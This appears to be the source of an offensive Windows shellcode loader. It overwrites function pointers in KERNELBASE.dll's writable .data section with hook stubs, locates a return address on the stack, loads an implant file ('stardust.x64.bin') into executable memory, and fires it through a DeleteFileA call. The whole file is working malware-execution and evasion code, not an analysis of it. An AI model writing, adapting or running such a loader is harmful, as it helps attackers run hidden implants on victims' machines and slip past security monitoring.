#include "dereferencePtr.h"

#pragma intrinsic(_ReturnAddress) 

__declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }

NATIVE_VALUE Global_OrigReferenceAddrOne = 0;
NATIVE_VALUE Global_OrigReferenceAddrTwo = 0;
NATIVE_VALUE MainAddr = 0;
NATIVE_VALUE Global_OrigCreateFileReturnAddr = 0;
NATIVE_VALUE FinalStackVal = 0;
NATIVE_VALUE HeapAddress = 0;

DWORD index = 0;

PVOID GlobalretAddressToUserCode = 0;

WORD cw = 0;

NATIVE_VALUE SizeOfStack = 0;

NATIVE_VALUE* ToOverWrite1 = 0;
NATIVE_VALUE* ToOverWrite2 = 0;

NATIVE_VALUE InstallHook(PVOID Addy2overwrite)
{
	MainAddr = *(NATIVE_VALUE*)Addy2overwrite;

	*(NATIVE_VALUE*)Addy2overwrite = (NATIVE_VALUE)HookStub;

	return 0;
}

NATIVE_VALUE InstallLabelOne(NATIVE_VALUE* Addy2overwrite)
{
	ToOverWrite1 = Addy2overwrite;

	Global_OrigReferenceAddrOne = *(NATIVE_VALUE*)Addy2overwrite;

	*(NATIVE_VALUE*)Addy2overwrite = (NATIVE_VALUE)labelStubOne;

	return 0;
}

NATIVE_VALUE InstallLabelTwo(NATIVE_VALUE* Addy2overwrite)
{
	ToOverWrite2 = Addy2overwrite;

	Global_OrigReferenceAddrTwo = *Addy2overwrite;

	*Addy2overwrite = (NATIVE_VALUE)labelStubTwo;

	return 0;
}

extern "C" char message[];
char message[] = "ExecImplantStub executed!\n";

BOOL IsMemoryWritable(PBYTE address) {
	MEMORY_BASIC_INFORMATION mbi;
	if (VirtualQuery(address, &mbi, sizeof(mbi))) {
		return (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY)) != 0;
	}
	return FALSE; // Failed to query memory protection
}

NATIVE_VALUE* FindAddress()
{
	IMAGE_DOS_HEADER* KernelBasepImageDosHeader = NULL;
	IMAGE_NT_HEADERS* KernelBasepImageNtHeader = NULL;
	IMAGE_SECTION_HEADER* pCurrSectionHeader = NULL;
	DWORD dwReadOffset = 0;
	BYTE* pCurrPtr = NULL;
	int flag = 0;

	PBYTE KernelBaseModuleBase = (PBYTE)GetModuleHandleA("KERNELBASE.dll"); //replace this with PEB walking if you want
	KernelBasepImageDosHeader = (PIMAGE_DOS_HEADER)KernelBaseModuleBase;
	KernelBasepImageNtHeader = (IMAGE_NT_HEADERS*)(KernelBaseModuleBase + KernelBasepImageDosHeader->e_lfanew);
	if (KernelBasepImageNtHeader->Signature != IMAGE_NT_SIGNATURE)
		return 0;
	DWORD dllSize = KernelBasepImageNtHeader->OptionalHeader.SizeOfImage;
	for (DWORD i = 0; i < KernelBasepImageNtHeader->FileHeader.NumberOfSections; i++)
	{
		pCurrSectionHeader = (IMAGE_SECTION_HEADER*)((BYTE*)&KernelBasepImageNtHeader->OptionalHeader + KernelBasepImageNtHeader->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (strcmp((const char*)pCurrSectionHeader->Name, ".data") == 0)
		{
			int StubIndex = 0;
			dwReadOffset = pCurrSectionHeader->VirtualAddress;
			for (DWORD ii = 0; ii < pCurrSectionHeader->Misc.VirtualSize / sizeof(NATIVE_VALUE); ii++)
			{
				// check if the current value contains the target address
				pCurrPtr = KernelBaseModuleBase + dwReadOffset;
				flag = 1;
				NATIVE_VALUE checkBytes = *(NATIVE_VALUE*)pCurrPtr;
				if (checkBytes < (NATIVE_VALUE)KernelBaseModuleBase || checkBytes >(NATIVE_VALUE)KernelBaseModuleBase + dllSize)
					flag = 0;
				if (flag)
					if ((*((PBYTE)checkBytes + cw) == 0xff && *((PBYTE)checkBytes + cw + 1) == 0x25)) //check for a near absolute jmp
					{
						StubIndex++;
						printf("dereferenced value - %p\n", *(NATIVE_VALUE*)pCurrPtr);
						printf("address to overwrite - %p\n\n", (NATIVE_VALUE*)pCurrPtr);

						if (!IsMemoryWritable(pCurrPtr)) {
							printf("Skipping address %p - Memory is not writable\n", pCurrPtr);
							continue;
						}
						if (StubIndex == 1)
						{
							InstallLabelOne((NATIVE_VALUE*)pCurrPtr);
						}
						if (StubIndex == 2)
						{
							InstallLabelTwo((NATIVE_VALUE*)pCurrPtr);
						}
					}
				dwReadOffset += sizeof(NATIVE_VALUE);
			}
			return 0;
		}
	}
	return 0;
}

VOID GetStackOffset()
{
	FinalStackVal = FinalStackVal + STACK_OFFSET_ADJUST;
	NATIVE_VALUE InitialStackVal = FinalStackVal;

	for (int i = 0; i < MAX_STACK_SEARCH; i++) //max_stack_search for obvious safety reasons
	{
		if ((*(NATIVE_VALUE*)(FinalStackVal + (i * sizeof(NATIVE_VALUE)))) == (NATIVE_VALUE)GlobalretAddressToUserCode)
		{
			SizeOfStack = (FinalStackVal + (i * 8)) - InitialStackVal;
			return;
		}
	}
	return;
}

VOID FindStackPtr()
{
	//locate the next near call to find return address of the winapi call.
	//understand that trying to dynamically load the function and then indulging
	//in baboon-ish fuckery can and will break the code in the below section
	for (int i = 0; i < 100; i++) //scan upto next 100 instructions to be on the safe side
	{
		if ((*((PBYTE)GlobalretAddressToUserCode + cw + i) == 0xff && *((PBYTE)GlobalretAddressToUserCode + cw + i + 1) == 0x15))
		{
			GlobalretAddressToUserCode = (PVOID)((NATIVE_VALUE)(GlobalretAddressToUserCode)+i + 6);
			return;
		}
	}
}

DWORD ExecuteTargetFunction()
{
	//the caller function will get the ret address before the target winapi is called
	GlobalretAddressToUserCode = (PVOID)caller();
	// call the target winapi
	DeleteFileA("x");

	return 0;
}

LPVOID LoadFileIntoMemory(LPSTR Path, PDWORD MemorySize) {
	PVOID  ImageBuffer = NULL;
	DWORD  dwBytesRead = 0;
	HANDLE hFile = NULL;
	hFile = CreateFileA(Path, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Error opening %s\r\n", Path);
		return NULL;
	}

	if (MemorySize)
		*MemorySize = GetFileSize(hFile, 0);
	ImageBuffer = (PBYTE)LocalAlloc(LPTR, *MemorySize);

	ReadFile(hFile, ImageBuffer, *MemorySize, &dwBytesRead, 0);
	CloseHandle(hFile);

	return ImageBuffer;
}

int main()
{
	PVOID ShellcodeBytes = NULL;
	DWORD ShellcodeSize = 0;
	DWORD OldProtection = 0;
	BOOL ReturnValue;

	FindAddress(); //returns the address of the function pointer in .data section (which is RW marked)

	ExecuteTargetFunction(); // execute this and get the address which is to be searched on stack

	printf("Size Of Stack - 0x%llx\n", SizeOfStack);

	ShellcodeBytes = LoadFileIntoMemory((LPSTR)"C:\\Users\\Shadow\\Desktop\\stardust.x64.bin", &ShellcodeSize);
	HeapAddress = (DWORD64)VirtualAlloc(NULL, ShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy((PVOID)HeapAddress, ShellcodeBytes, ShellcodeSize);
	printf("Address of loaded shellcode %p\n", (PVOID)HeapAddress);
	getchar();

	if (index == 1)
	{
		InstallHook(ToOverWrite1);
	}
	if (index == 2)
	{
		InstallHook(ToOverWrite2);
	}
	printf("Deleting file to achieve main implant execution\n");
	DeleteFileA("x");

	return 0;
}
